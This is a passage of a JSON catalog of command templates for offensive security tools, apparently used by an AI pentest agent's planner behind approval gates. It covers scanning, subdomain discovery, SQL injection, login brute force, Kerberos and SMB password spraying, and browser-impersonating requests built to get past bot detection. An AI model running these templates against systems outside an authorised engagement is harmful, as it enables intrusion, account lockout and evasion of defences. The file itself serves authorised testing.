{
  "schema_version": "1.0",
  "note": "Curated catalog of the standard offensive toolbox. DATA ONLY — this file executes nothing. Every invocation here is a TEMPLATE the planner draws on so proposed commands are well-formed and consistent; each one still goes through the same gated executor (approve-each, heuristic red-confirm, target/scope lock, argv-only). Templates are written from each tool's own documentation and standard usage. Placeholders use <angle-brackets>; <target> is filled by the composer's substitute_target so a rendered command points at the real engagement target and nothing else.",
  "placeholders": {
    "<contract>": "Contract / program name (e.g. Vault) — the fuzz/target name a tool needs.",
    "<target>": "Host, IP or URL under test — filled from the engagement target.",
    "<domain>": "DNS domain / AD domain name.",
    "<url>": "Full URL including scheme.",
    "<wordlist>": "Path to a wordlist.",
    "<ports>": "Port or port range.",
    "<user>": "A single username.",
    "<userlist>": "Path to a username list.",
    "<passlist>": "Path to a password list.",
    "<password>": "A single password.",
    "<hashfile>": "Path to a file of captured hashes.",
    "<dc-ip>": "Domain controller IP.",
    "<output>": "Output file/directory path.",
    "<binary>": "Path to a local binary under analysis.",
    "<file>": "Path to a local file.",
    "<size>": "A response size in bytes, used to filter baseline/404 noise.",
    "<technique>": "A technique/tag name the tool understands (e.g. a nuclei tag).",
    "<database>": "Database name on the target DBMS.",
    "<hash-mode>": "Numeric hash type/mode (hashcat -m).",
    "<base-dn>": "LDAP base DN, e.g. DC=corp,DC=local.",
    "<project>": "Local analysis project name.",
    "<pattern>": "A literal string or regex to search for.",
    "<libc>": "Path to a libc shared object (e.g. libc.so.6) matching the target binary.",
    "<symbol>": "A libc symbol name whose leaked address is known (e.g. printf).",
    "<offset>": "The known low bits / offset of a leaked address, used to identify a libc.",
    "<listener>": "The ATTACKER-side callback address. Deliberately not named <lhost>/<ip>: those spell a keyword the composer's target substitution rewrites, and the callback host is yours, not the target's.",
    "<listener-port>": "The attacker-side callback port.",
    "<ntlm-hash>": "An NTLM hash for pass-the-hash, LM:NT or bare NT.",
    "<interface>": "Local network interface name.",
    "<param>": "A single request parameter name.",
    "<token>": "A JWT / session token.",
    "<group>": "An AD group name.",
    "<ca>": "AD CS certificate authority name.",
    "<template-name>": "AD CS certificate template name.",
    "<cert>": "Path to a certificate / .pfx file.",
    "<keyfile>": "Path to a private key file.",
    "<query>": "A search term for a module/exploit/index lookup.",
    "<module>": "A framework module path.",
    "<api-key>": "API key for a third-party service.",
    "<spn-user>": "A SECOND account name, distinct from <user> — the account being acted ON when <user> is the account acting.",
    "<subs-file>": "Path to a file of subdomains/hostnames, one per line.",
    "<urls-file>": "Path to a file of URLs, one per line.",
    "<js-file>": "Path to a JavaScript file, or a file listing JS URLs.",
    "<resolvers>": "Path to a trusted DNS resolvers list (e.g. /usr/share/resolvers.txt).",
    "<asn>": "An autonomous system number, e.g. AS15169.",
    "<cidr>": "An IP range in CIDR notation, e.g. 10.0.0.0/24.",
    "<org>": "An organisation / GitHub org name.",
    "<bucket>": "A cloud storage bucket name.",
    "<keyword>": "A base keyword/company name to derive cloud asset names from.",
    "<token-file>": "Path to a file of API tokens, one per line.",
    "<dorks-file>": "Path to a file of dork queries, one per line.",
    "<path>": "A URL path component, e.g. /admin.",
    "<payload>": "A payload: a msfvenom/metasploit payload name or path, or the command, script or implant to run when a persistence mechanism fires.",
    "<name>": "A name/identifier for the object being created (task, service, registry value, unit, shortcut).",
    "<tunnel-zone>": "A DNS zone the OPERATOR controls and has delegated to their own name server — the suffix a DNS tunnel encodes its traffic under. Deliberately not named <domain>: that spelling the composer's target substitution rewrites, and the tunnel's zone is yours, not the target's (same reason as <listener>).",
    "<tunnel-net>": "The point-to-point address (optionally with a netmask) the OPERATOR assigns to a tunnel interface, e.g. an unused private /27. Not spelled with ip/host for the same reason as <listener>: the tunnel's own network is never the target's.",
    "<local-port>": "A port on THIS box, bound locally by a forward or relay.",
    "<socks-port>": "The local SOCKS5 port a pivot exposes on this box (chisel's default is 1080).",
    "<schema-file>": "Path to a GraphQL schema document (SDL, or an introspection JSON).",
    "<endpoint>": "A GraphQL endpoint URL including the path, e.g. https://host/graphql - GraphQL is mounted anywhere, so the path is part of the target and never assumed."
  },
  "tools": [
    {
      "name": "nmap",
      "category": "recon",
      "purpose": "Port, service and version discovery, plus a large scripting engine for protocol-level enumeration. The default first look at a host.",
      "phases": [
        "recon",
        "enumeration"
      ],
      "techniques": [
        "port scanning",
        "service/version detection",
        "OS fingerprinting",
        "NSE script enumeration"
      ],
      "docs": "https://nmap.org/book/man.html",
      "templates": [
        {
          "label": "Full TCP port sweep",
          "template": "nmap -p- --min-rate 2000 -T4 -oA <output> <target>",
          "note": "Find every open TCP port first; enumerate them in a second pass."
        },
        {
          "label": "Service + default scripts on known ports",
          "template": "nmap -sCV -p <ports> -oA <output> <target>",
          "note": "Run after the sweep, against only the ports it found."
        },
        {
          "label": "Top UDP ports",
          "template": "nmap -sU --top-ports 100 -oA <output> <target>",
          "note": "UDP is slow; the top ports catch SNMP/DNS/NTP/TFTP."
        },
        {
          "label": "Vulnerability-ish NSE sweep",
          "template": "nmap --script vuln -p <ports> <target>",
          "note": "Noisy and prone to false positives — treat output as leads."
        }
      ],
      "flags": [
        {
          "flag": "-p-",
          "what": "all 65535 TCP ports"
        },
        {
          "flag": "-sC",
          "what": "default NSE scripts"
        },
        {
          "flag": "-sV",
          "what": "service/version detection"
        },
        {
          "flag": "-oA",
          "what": "write all three output formats"
        },
        {
          "flag": "--min-rate",
          "what": "packets/sec floor (speed vs stealth)"
        }
      ]
    },
    {
      "name": "masscan",
      "category": "recon",
      "purpose": "Asynchronous port scanner built for very large ranges — sweeps a whole network far faster than nmap, at the cost of detail.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "mass port scanning",
        "network sweep"
      ],
      "docs": "https://github.com/robertdavidgraham/masscan",
      "templates": [
        {
          "label": "Fast sweep of a range",
          "template": "masscan <target> -p<ports> --rate 1000 -oL <output>",
          "note": "Keep --rate conservative on networks you do not own; it is a flood by design."
        },
        {
          "label": "Top ports across a CIDR",
          "template": "masscan <target> --top-ports 100 --rate 1000 -oJ <output>",
          "note": "Feed the open ports into nmap -sCV for detail."
        }
      ],
      "flags": [
        {
          "flag": "--rate",
          "what": "packets per second (the whole point — and the risk)"
        },
        {
          "flag": "-oL / -oJ",
          "what": "list / JSON output"
        },
        {
          "flag": "--exclude",
          "what": "addresses to skip"
        }
      ]
    },
    {
      "name": "amass",
      "category": "recon",
      "purpose": "In-depth subdomain enumeration and attack-surface mapping, combining passive sources with active resolution.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "subdomain enumeration",
        "OSINT",
        "DNS mapping"
      ],
      "docs": "https://github.com/owasp-amass/amass",
      "templates": [
        {
          "label": "Passive enumeration",
          "template": "amass enum -passive -d <domain> -o <output>",
          "note": "No traffic to the target — safe first pass and usually in scope."
        },
        {
          "label": "Active enumeration",
          "template": "amass enum -active -d <domain> -o <output>",
          "note": "Resolves and probes; confirm it is in scope first."
        }
      ],
      "flags": [
        {
          "flag": "-passive",
          "what": "OSINT sources only, no target traffic"
        },
        {
          "flag": "-d",
          "what": "target domain"
        },
        {
          "flag": "-brute",
          "what": "add brute-force subdomain guessing"
        }
      ]
    },
    {
      "name": "subfinder",
      "category": "recon",
      "purpose": "Fast passive subdomain discovery from many public sources. The usual first step of a bug-bounty recon chain.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "subdomain enumeration",
        "OSINT"
      ],
      "docs": "https://github.com/projectdiscovery/subfinder",
      "templates": [
        {
          "label": "Passive subdomains",
          "template": "subfinder -d <domain> -all -silent -o <output>",
          "note": "Pipe into dnsx/httpx to keep only what resolves and answers."
        },
        {
          "label": "Subdomains, then live hosts",
          "template": "subfinder -d <domain> -silent | httpx -silent -status-code -title",
          "note": "The standard recon one-liner: discover, then probe."
        }
      ],
      "flags": [
        {
          "flag": "-d",
          "what": "target domain"
        },
        {
          "flag": "-all",
          "what": "use every configured source"
        },
        {
          "flag": "-silent",
          "what": "results only — pipeline friendly"
        }
      ]
    },
    {
      "name": "assetfinder",
      "category": "recon",
      "purpose": "Small, fast passive subdomain finder — useful alongside subfinder/amass because the source sets differ.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "subdomain enumeration",
        "OSINT"
      ],
      "docs": "https://github.com/tomnomnom/assetfinder",
      "templates": [
        {
          "label": "Subdomains for a domain",
          "template": "assetfinder --subs-only <domain> | sort -u | tee <output>",
          "note": "Union its output with subfinder's; neither is a superset."
        }
      ],
      "flags": [
        {
          "flag": "--subs-only",
          "what": "print subdomains only"
        }
      ]
    },
    {
      "name": "theHarvester",
      "category": "recon",
      "purpose": "OSINT collection of emails, names, subdomains and hosts from public search engines and data sources.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "OSINT",
        "email harvesting",
        "employee enumeration"
      ],
      "docs": "https://github.com/laramies/theHarvester",
      "templates": [
        {
          "label": "Multi-source OSINT sweep",
          "template": "theHarvester -d <domain> -b all -f <output>",
          "note": "Passive; feeds username lists for later credential testing."
        },
        {
          "label": "One source, quick pass",
          "template": "theHarvester -d <domain> -b crtsh -l 500",
          "note": "crt.sh is certificate transparency — cheap and reliable."
        }
      ],
      "flags": [
        {
          "flag": "-d",
          "what": "target domain"
        },
        {
          "flag": "-b",
          "what": "source (or 'all')"
        },
        {
          "flag": "-f",
          "what": "write HTML/JSON report"
        }
      ]
    },
    {
      "name": "dnsx",
      "category": "recon",
      "purpose": "Fast DNS resolution and probing toolkit — filters a candidate subdomain list down to what actually resolves.",
      "phases": [
        "recon"
      ],
      "techniques": [
        "DNS resolution",
        "subdomain validation",
        "DNS record enumeration"
      ],
      "docs": "https://github.com/projectdiscovery/dnsx",
      "templates": [
        {
          "label": "Resolve a candidate list",
          "template": "dnsx -l <file> -silent -a -resp -o <output>",
          "note": "Turns a guess list into confirmed hosts before you touch them."
        },
        {
          "label": "Record types for a domain",
          "template": "dnsx -d <domain> -silent -a -aaaa -cname -mx -ns -txt",
          "note": "CNAMEs matter — a dangling one is a takeover candidate."
        }
      ],
      "flags": [
        {
          "flag": "-l",
          "what": "input list of hosts"
        },
        {
          "flag": "-resp",
          "what": "show the resolved value"
        },
        {
          "flag": "-cname",
          "what": "CNAME records (subdomain-takeover leads)"
        }
      ]
    },
    {
      "name": "curl-impersonate",
      "category": "recon",
      "purpose": "A curl built to be INDISTINGUISHABLE FROM A BROWSER on the wire — Chrome's or Firefox's TLS cipher and extension order (JA3/JA4), HTTP/2 SETTINGS and frame order, and the full default header set including Sec-CH-UA Client Hints. Measured need: on a live Akamai-fronted program, nine of eleven hosts refused bare curl/ffuf/nuclei before request one (h2 stream reset, h1.1 timeout) while a real browser was served normally. The discriminator is the header set and the handshake, NOT the User-Agent string — spoofing the UA alone failed identically to not spoofing it.",
      "phases": [
        "recon",
        "enumeration"
      ],
      "techniques": [
        "browser-fidelity TLS handshake (JA3/JA4)",
        "HTTP/2 SETTINGS and pseudo-header ordering",
        "full browser header set incl. Client Hints"
      ],
      "docs": "https://github.com/lwthiker/curl-impersonate",
      "templates": [
        {
          "label": "Fetch as Chrome (use when plain curl gets no response at all)",
          "template": "curl_chrome116 -sS -o /dev/null -w '%{http_code} %{size_download}\\n' <url>",
          "note": "The curl_* WRAPPERS are the product, not the binary: they carry the header list and the cipher order. curl-impersonate-chrome on its own is just a curl with a different TLS library."
        },
        {
          "label": "Fetch as Firefox",
          "template": "curl_ff109 -sS -o /dev/null -w '%{http_code} %{size_download}\\n' <url>",
          "note": "A second fingerprint. If Chrome is refused and Firefox is not, that is a finding."
        },
        {
          "label": "Headers only, as Chrome",
          "template": "curl_chrome116 -sSI <url>",
          "note": "Read the Server / edge headers with a client the edge will actually answer."
        },
        {
          "label": "Through the recording proxy, so the exchange is captured",
          "template": "curl_chrome116 -sS -x http://127.0.0.1:8090 -o /dev/null -w '%{http_code}\\n' <url>",
          "note": "Sends it through the ZAP recording proxy so the request and response land in history and the active scanner can then aim at that URL."
        }
      ],
      "notes": "RECORDED HONESTLY: this makes HackPit's traffic indistinguishable from a browser's. It is built deliberately, for an authorized safe-harbour program. It introduces NO new gate and relaxes none — it is an ordinary sandbox binary and every run goes through the same four gates as curl itself. The pinned build impersonates Chrome 116 / Firefox 109; whether that vintage satisfies a current bot manager is a measurement, not an assumption, and docs/proof/ is where it gets made."
    },
    {
      "name": "httpx",
      "category": "recon",
      "purpose": "Probes a host list for live HTTP services and reports status, title, tech and TLS detail. The bridge from recon to web testing.",
      "phases": [
        "recon",
        "enumeration"
      ],
      "techniques": [
        "HTTP probing",
        "technology fingerprinting",
        "live-host filtering"
      ],
      "docs": "https://github.com/projectdiscovery/httpx",
      "templates": [
        {
          "label": "Probe a host list",
          "template": "httpx -l <file> -silent -status-code -title -tech-detect -o <output>",
          "note": "The output is the real attack surface; everything else was a guess."
        },
        {
          "label": "Probe one target",
          "template": "httpx -u <target> -status-code -title -tech-detect -follow-redirects",
          "note": "Redirects often reveal the real application host."
        }
      ],
      "flags": [
        {
          "flag": "-tech-detect",
          "what": "Wappalyzer-style technology fingerprint"
        },
        {
          "flag": "-status-code",
          "what": "report the HTTP status"
        },
        {
          "flag": "-follow-redirects",
          "what": "chase 30x to the real endpoint"
        }
      ]
    },
    {
      "name": "ffuf",
      "category": "web",
      "purpose": "Very fast HTTP fuzzer — content discovery, parameter and vhost fuzzing, and form/login brute force via the FUZZ keyword.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "content discovery",
        "parameter fuzzing",
        "vhost fuzzing",
        "login brute force"
      ],
      "docs": "https://github.com/ffuf/ffuf/wiki",
      "templates": [
        {
          "label": "Directory discovery",
          "template": "ffuf -u <target>/FUZZ -w <wordlist> -mc 200,204,301,302,307,401,403 -o <output>",
          "note": "Match on status; filter noise with -fs once you see the 404 size."
        },
        {
          "label": "Virtual-host discovery",
          "template": "ffuf -u <target> -H 'Host: FUZZ.<domain>' -w <wordlist> -fs <size>",
          "note": "-fs must filter the default response size or everything matches."
        },
        {
          "label": "Parameter discovery",
          "template": "ffuf -u '<target>/endpoint?FUZZ=test' -w <wordlist> -fs <size>",
          "note": "Hidden parameters are a common IDOR/injection entry point."
        },
        {
          "label": "POST login brute force",
          "template": "ffuf -u <target>/login -X POST -d 'username=<user>&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w <passlist> -fc 401",
          "note": "Authorized testing only — check lockout policy before running."
        }
      ],
      "flags": [
        {
          "flag": "-w",
          "what": "wordlist (FUZZ is the injection point)"
        },
        {
          "flag": "-mc / -fc",
          "what": "match / filter by status code"
        },
        {
          "flag": "-fs",
          "what": "filter by response size — the noise killer"
        },
        {
          "flag": "-recursion",
          "what": "recurse into discovered directories"
        }
      ]
    },
    {
      "name": "feroxbuster",
      "category": "web",
      "purpose": "Recursive content discovery in Rust — fast, and recursion-first, so it maps a tree rather than one level.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "content discovery",
        "recursive directory brute force"
      ],
      "docs": "https://github.com/epi052/feroxbuster",
      "templates": [
        {
          "label": "Recursive discovery",
          "template": "feroxbuster -u <target> -w <wordlist> -d 3 -o <output>",
          "note": "-d bounds the recursion depth; unbounded recursion is very loud."
        },
        {
          "label": "With extensions",
          "template": "feroxbuster -u <target> -w <wordlist> -x php,txt,bak,old -o <output>",
          "note": ".bak/.old often expose source or config."
        }
      ],
      "flags": [
        {
          "flag": "-d",
          "what": "recursion depth"
        },
        {
          "flag": "-x",
          "what": "file extensions to append"
        },
        {
          "flag": "-C",
          "what": "filter out status codes"
        }
      ]
    },
    {
      "name": "gobuster",
      "category": "web",
      "purpose": "Directory, DNS, vhost and S3-bucket brute forcing. Simple and dependable for a first content sweep.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "content discovery",
        "DNS brute force",
        "vhost brute force"
      ],
      "docs": "https://github.com/OJ/gobuster",
      "templates": [
        {
          "label": "Directory brute force",
          "template": "gobuster dir -u <target> -w <wordlist> -t 40 -o <output>",
          "note": "Add -x for extensions once you know the stack."
        },
        {
          "label": "DNS subdomain brute force",
          "template": "gobuster dns -d <domain> -w <wordlist> -t 40 -o <output>",
          "note": "Complements passive enumeration with guessable names."
        },
        {
          "label": "Virtual-host brute force",
          "template": "gobuster vhost -u <target> -w <wordlist> --append-domain -o <output>",
          "note": "Finds sites that only answer to the right Host header."
        }
      ],
      "flags": [
        {
          "flag": "dir / dns / vhost",
          "what": "the mode — they take different arguments"
        },
        {
          "flag": "-t",
          "what": "concurrent threads"
        },
        {
          "flag": "-x",
          "what": "extensions to try"
        }
      ]
    },
    {
      "name": "nuclei",
      "category": "web",
      "purpose": "Template-driven vulnerability and misconfiguration scanner with a large community ruleset. Breadth-first triage of a known surface.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "template-based scanning",
        "CVE detection",
        "misconfiguration detection",
        "exposure detection"
      ],
      "docs": "https://docs.projectdiscovery.io/tools/nuclei",
      "templates": [
        {
          "label": "Full template run",
          "template": "nuclei -u <target> -severity low,medium,high,critical -o <output>",
          "note": "Update templates first; results are leads to verify, not findings."
        },
        {
          "label": "Against a host list",
          "template": "nuclei -l <file> -severity high,critical -silent -o <output>",
          "note": "The standard post-httpx pass across a whole surface."
        },
        {
          "label": "One tag only",
          "template": "nuclei -u <target> -tags <technique> -o <output>",
          "note": "Narrow by tag (cve, exposure, takeover, misconfig) to cut noise."
        }
      ],
      "flags": [
        {
          "flag": "-severity",
          "what": "filter by severity"
        },
        {
          "flag": "-tags",
          "what": "run only templates with a tag"
        },
        {
          "flag": "-rl",
          "what": "rate limit — respect the target"
        }
      ]
    },
    {
      "name": "zaproxy",
      "aliases": [
        "zap",
        "owasp-zap"
      ],
      "category": "web",
      "purpose": "OWASP ZAP — spiders a web application and reports vulnerabilities. `-zapit` crawls and fingerprints without attacking; `-quickurl` spiders and then runs a full ACTIVE scan, sending live injection payloads at every parameter it found.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "web crawling",
        "passive vulnerability analysis",
        "active injection scanning",
        "OWASP Top 10 coverage"
      ],
      "docs": "https://www.zaproxy.org/docs/",
      "templates": [
        {
          "label": "Recon scan (no attack traffic)",
          "template": "zaproxy -cmd -zapit <target>",
          "note": "Crawls and fingerprints the app and prints a summary. Sends no attack traffic, so it needs approval but no red-confirm. Start here."
        },
        {
          "label": "Full active scan (report to the loot dir)",
          "template": "zaproxy -cmd -quickurl <target> -quickout <output>-zap.json",
          "note": "ACTIVE: spiders, then sends real SQLi/XSS/command-injection payloads at every discovered parameter. Requires the red-confirm. The -zap.json suffix is what the loot ingester keys on. Takes tens of minutes — raise timeout_seconds on the request, the 180s default will kill it (ceiling 3600)."
        },
        {
          "label": "Full active scan (HTML report for the write-up)",
          "template": "zaproxy -cmd -quickurl <target> -quickout <output>-zap.html",
          "note": "Same ACTIVE scan; -quickout picks the format from the extension. Use the .json form when you want the findings ingested into engagement state."
        }
      ],
      "flags": [
        {
          "flag": "-cmd",
          "what": "run inline and exit (no UI, no daemon left behind)"
        },
        {
          "flag": "-zapit",
          "what": "quick reconnaissance scan — crawl + fingerprint, no attack"
        },
        {
          "flag": "-quickurl",
          "what": "ACTIVE: the URL to attack (spider + active scan)"
        },
        {
          "flag": "-quickout",
          "what": "report path; format follows the extension (.json/.html/.md/.xml)"
        },
        {
          "flag": "-quickprogress",
          "what": "print progress bars while scanning"
        }
      ]
    },
    {
      "name": "nikto",
      "category": "web",
      "purpose": "Classic web-server scanner for known-dangerous files, outdated versions and server misconfiguration.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "web server scanning",
        "misconfiguration detection"
      ],
      "docs": "https://github.com/sullo/nikto",
      "templates": [
        {
          "label": "Standard scan",
          "template": "nikto -h <target> -o <output>",
          "note": "Very loud and signature-heavy; expect it in every WAF log."
        },
        {
          "label": "HTTPS with tuning",
          "template": "nikto -h <target> -ssl -Tuning 123bde -o <output>",
          "note": "-Tuning limits the test classes and the runtime."
        }
      ],
      "flags": [
        {
          "flag": "-h",
          "what": "target host"
        },
        {
          "flag": "-ssl",
          "what": "force TLS"
        },
        {
          "flag": "-Tuning",
          "what": "restrict which test classes run"
        }
      ]
    },
    {
      "name": "sqlmap",
      "category": "web",
      "purpose": "Automated SQL injection detection and exploitation across many DBMS and injection techniques.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "SQL injection",
        "database enumeration",
        "data extraction"
      ],
      "docs": "https://github.com/sqlmapproject/sqlmap/wiki/Usage",
      "templates": [
        {
          "label": "Test a parameter",
          "template": "sqlmap -u '<url>' --batch --level 2 --risk 1",
          "note": "Start low; raising level/risk sends far more, far noisier payloads."
        },
        {
          "label": "From a saved request",
          "template": "sqlmap -r <file> --batch --dbs",
          "note": "A saved request keeps auth headers/cookies intact — usually the reliable route."
        },
        {
          "label": "Enumerate a database",
          "template": "sqlmap -u '<url>' --batch -D <database> --tables",
          "note": "Enumerate before dumping; dumping data may exceed your authorization."
        }
      ],
      "flags": [
        {
          "flag": "--batch",
          "what": "accept defaults, no prompts"
        },
        {
          "flag": "--level / --risk",
          "what": "test breadth / payload aggressiveness"
        },
        {
          "flag": "-r",
          "what": "read the request from a file"
        },
        {
          "flag": "--technique",
          "what": "restrict injection techniques (BEUSTQ)"
        }
      ]
    },
    {
      "name": "wpscan",
      "category": "web",
      "purpose": "WordPress-specific scanner: core/plugin/theme versions, known vulnerabilities, and user enumeration.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "CMS enumeration",
        "plugin vulnerability detection",
        "user enumeration"
      ],
      "docs": "https://github.com/wpscanteam/wpscan",
      "templates": [
        {
          "label": "Enumerate plugins, themes, users",
          "template": "wpscan --url <target> --enumerate vp,vt,u --output <output>",
          "note": "vp/vt are the VULNERABLE plugins/themes only — much less noise."
        },
        {
          "label": "With the vulnerability API",
          "template": "wpscan --url <target> --enumerate vp --api-token <password>",
          "note": "The token unlocks the vulnerability database; without it you get versions only."
        }
      ],
      "flags": [
        {
          "flag": "--enumerate",
          "what": "what to enumerate (vp, vt, u, ap, at)"
        },
        {
          "flag": "--api-token",
          "what": "WPScan vulnerability database token"
        },
        {
          "flag": "--passwords",
          "what": "password list for login brute force"
        }
      ]
    },
    {
      "name": "dalfox",
      "category": "web",
      "purpose": "XSS scanner and parameter analyser — finds reflection points and verifies which are actually exploitable.",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "XSS detection",
        "parameter analysis",
        "DOM verification"
      ],
      "docs": "https://github.com/hahwul/dalfox",
      "templates": [
        {
          "label": "Scan a URL",
          "template": "dalfox url '<url>' -o <output>",
          "note": "Verifies reflection in a headless browser, so fewer false positives."
        },
        {
          "label": "Scan a URL list",
          "template": "dalfox file <file> --silence -o <output>",
          "note": "Pair with gau/waybackurls output for breadth."
        }
      ],
      "flags": [
        {
          "flag": "url / file / pipe",
          "what": "input mode"
        },
        {
          "flag": "--custom-payload",
          "what": "supply your own payload list"
        },
        {
          "flag": "--blind",
          "what": "blind-XSS callback endpoint"
        }
      ]
    },
    {
      "name": "whatweb",
      "category": "web",
      "purpose": "Web technology fingerprinting — server, framework, CMS, analytics and version hints from responses.",
      "phases": [
        "recon",
        "enumeration"
      ],
      "techniques": [
        "technology fingerprinting",
        "CMS identification"
      ],
      "docs": "https://github.com/urbanadventurer/WhatWeb",
      "templates": [
        {
          "label": "Fingerprint a target",
          "template": "whatweb -a 3 <target> --log-json=<output>",
          "note": "-a 3 is aggressive; -a 1 is passive and quieter."
        }
      ],
      "flags": [
        {
          "flag": "-a",
          "what": "aggression level 1-4"
        },
        {
          "flag": "--log-json",
          "what": "machine-readable output"
        }
      ]
    },
    {
      "name": "netexec",
      "aliases": [
        "nxc",
        "crackmapexec",
        "cme"
      ],
      "category": "network-ad",
      "purpose": "Swiss-army knife for SMB/WinRM/LDAP/MSSQL across a network — auth checks, share and user enumeration, and post-auth actions. The maintained successor to CrackMapExec.",
      "phases": [
        "enumeration",
        "exploitation",
        "post-exploitation"
      ],
      "techniques": [
        "SMB enumeration",
        "credential validation",
        "password spraying",
        "share enumeration",
        "lateral movement"
      ],
      "docs": "https://www.netexec.wiki/",
      "templates": [
        {
          "label": "Unauthenticated SMB fingerprint",
          "template": "netexec smb <target>",
          "note": "Names the host, domain, OS and signing state before you have creds."
        },
        {
          "label": "Validate credentials",
          "template": "netexec smb <target> -u <user> -p <password>",
          "note": "[+] means valid; (Pwn3d!) means local admin."
        },
        {
          "label": "Password spray a user list",
          "template": "netexec smb <target> -u <userlist> -p <password> --continue-on-success",
          "note": "ONE password across many users. Check lockout thresholds first."
        },
        {
          "label": "Enumerate shares",
          "template": "netexec smb <target> -u <user> -p <password> --shares",
          "note": "READ on an unexpected share is a common foothold."
        },
        {
          "label": "Enumerate domain users",
          "template": "netexec smb <target> -u <user> -p <password> --users",
          "note": "Feeds kerbrute/hashcat later in the chain."
        }
      ],
      "flags": [
        {
          "flag": "smb / winrm / ldap / mssql",
          "what": "the protocol module"
        },
        {
          "flag": "--continue-on-success",
          "what": "keep going after the first hit (spraying)"
        },
        {
          "flag": "--shares / --users / --groups",
          "what": "enumeration modules"
        },
        {
          "flag": "-H",
          "what": "authenticate with an NTLM hash instead of a password"
        }
      ]
    },
    {
      "name": "enum4linux-ng",
      "aliases": [
        "enum4linux"
      ],
      "category": "network-ad",
      "purpose": "Rewritten SMB/NetBIOS enumeration — users, groups, shares, password policy and OS detail, with structured output.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "SMB enumeration",
        "user enumeration",
        "password policy discovery",
        "RID cycling"
      ],
      "docs": "https://github.com/cddmp/enum4linux-ng",
      "templates": [
        {
          "label": "Full enumeration",
          "template": "enum4linux-ng -A <target> -oJ <output>",
          "note": "-A is everything; the password policy tells you if spraying is safe."
        },
        {
          "label": "Authenticated enumeration",
          "template": "enum4linux-ng -A -u <user> -p <password> <target>",
          "note": "Credentials usually turn a thin null-session result into a full one."
        }
      ],
      "flags": [
        {
          "flag": "-A",
          "what": "all simple enumeration"
        },
        {
          "flag": "-oJ / -oY",
          "what": "JSON / YAML output"
        },
        {
          "flag": "-R",
          "what": "RID cycling for user discovery"
        }
      ]
    },
    {
      "name": "smbmap",
      "category": "network-ad",
      "purpose": "Enumerates SMB shares and, critically, the permissions on them — read/write access per share at a glance.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "SMB share enumeration",
        "permission discovery",
        "file search"
      ],
      "docs": "https://github.com/ShawnDEvans/smbmap",
      "templates": [
        {
          "label": "Null-session share list",
          "template": "smbmap -H <target>",
          "note": "Anonymous read on a share is a frequent initial foothold."
        },
        {
          "label": "Authenticated share list",
          "template": "smbmap -H <target> -u <user> -p <password>",
          "note": "Shows READ/WRITE per share for that identity."
        },
        {
          "label": "Recursive listing of a share",
          "template": "smbmap -H <target> -u <user> -p <password> -r <file>",
          "note": "Look for config files and backups before anything else."
        }
      ],
      "flags": [
        {
          "flag": "-H",
          "what": "target host"
        },
        {
          "flag": "-r",
          "what": "recursive directory listing"
        },
        {
          "flag": "-A",
          "what": "download files matching a pattern"
        }
      ]
    },
    {
      "name": "kerbrute",
      "category": "network-ad",
      "purpose": "Kerberos pre-auth abuse: username enumeration and password spraying that do not generate normal logon failure events.",
      "phases": [
        "enumeration",
        "exploitation"
      ],
      "techniques": [
        "Kerberos user enumeration",
        "password spraying",
        "AS-REP discovery"
      ],
      "docs": "https://github.com/ropnop/kerbrute",
      "templates": [
        {
          "label": "Enumerate valid usernames",
          "template": "kerbrute userenum -d <domain> --dc <dc-ip> <userlist>",
          "note": "Valid names come back without a failed-logon event on most configs."
        },
        {
          "label": "Password spray",
          "template": "kerbrute passwordspray -d <domain> --dc <dc-ip> <userlist> <password>",
          "note": "One password, many users. Read the lockout policy first — this locks accounts."
        }
      ],
      "flags": [
        {
          "flag": "userenum / passwordspray / bruteuser",
          "what": "the mode"
        },
        {
          "flag": "-d",
          "what": "AD domain"
        },
        {
          "flag": "--dc",
          "what": "domain controller to query"
        }
      ]
    },
    {
      "name": "hydra",
      "category": "network-ad",
      "purpose": "Online credential brute force across many protocols (SSH, FTP, SMB, RDP, HTTP forms, and more).",
      "phases": [
        "exploitation"
      ],
      "techniques": [
        "credential brute force",
        "password spraying",
        "login form attack"
      ],
      "docs": "https://github.com/vanhauser-thc/thc-hydra",
      "templates": [
        {
          "label": "SSH",
          "template": "hydra -L <userlist> -P <passlist> -t 4 ssh://<target>",
          "note": "Keep -t low: SSH rate-limits and high concurrency just gets you dropped."
        },
        {
          "label": "HTTP POST form",
          "template": "hydra -l <user> -P <passlist> <target> http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
          "note": "The F= string must match the real failure text or every attempt reads as success."
        },
        {
          "label": "SMB",
          "template": "hydra -L <userlist> -p <password> smb://<target>",
          "note": "One password across users is spraying — mind the lockout policy."
        }
      ],
      "flags": [
        {
          "flag": "-l / -L",
          "what": "single user / user list"
        },
        {
          "flag": "-p / -P",
          "what": "single password / password list"
        },
        {
          "flag": "-t",
          "what": "parallel tasks — lower is safer"
        },
        {
          "flag": "-f",
          "what": "stop at the first valid pair"
        }
      ]
    },
    {
      "name": "ldapsearch",
      "category": "network-ad",
      "purpose": "Raw LDAP querying of a directory — the ground truth for AD objects, attributes and ACLs.",
      "phases": [
        "enumeration"
      ],
      "techniques": [
        "LDAP enumeration",
        "AD object discovery",
        "attribute harvesting"
      ],
      "docs": "https://linux.die.net/man/1/ldapsearch",
      "templates": [
        {
          "label": "Anonymous naming contexts",
          "template": "ldapsearch -x -H ldap://<target> -s base namingcontexts",
          "note": "The cheapest way to confirm LDAP and learn the base DN."
        },
        {
          "label": "Authenticated user dump",
          "template": "ldapsearch -x -H ldap://<target> -D '<user>@<domain>' -w <password> -b '<base-dn>' '(objectClass=user)'",
